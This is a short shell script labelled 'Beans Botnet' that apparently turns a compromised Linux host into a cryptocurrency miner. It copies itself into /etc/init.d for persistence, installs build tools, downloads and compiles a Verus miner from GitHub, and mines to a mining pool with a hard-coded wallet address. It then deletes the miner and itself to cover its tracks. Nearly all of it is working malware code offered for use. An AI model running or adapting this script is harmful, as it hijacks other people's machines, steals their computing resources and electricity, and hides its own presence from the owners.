################
#    Beans     #
#    Botnet    #
###############
filename="$0"
# Persistance Mech
mv $filename /etc/init.d/
chmod +x /etc/init.d/$filename
##################
# Config
pool="stratum+tcp://ap.luckpool.net:3956"
addr="REPN6Sd2hXkR63mwAisX6Hd6qvo8w6sbt1"
worker="beans"
algo="verus"
thread=4
# End of config
apt-get update && apt-get upgrade -y
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git nano
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer
cd ccminer
chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh
./build.sh || sh build.sh
./ccminer -a $algo -o $pool -u $addr.$worker -p x -t $thread  # Change address, and change pool port (this is only required with bigger mining botnet1s, look at comments in the original repository for info = https://github.com/chilloxop/miners/commit/5b7edc1c785ac0b2ec622d221ec1e2d669991a51
rm -rf ccminer
rm -- "$filename"
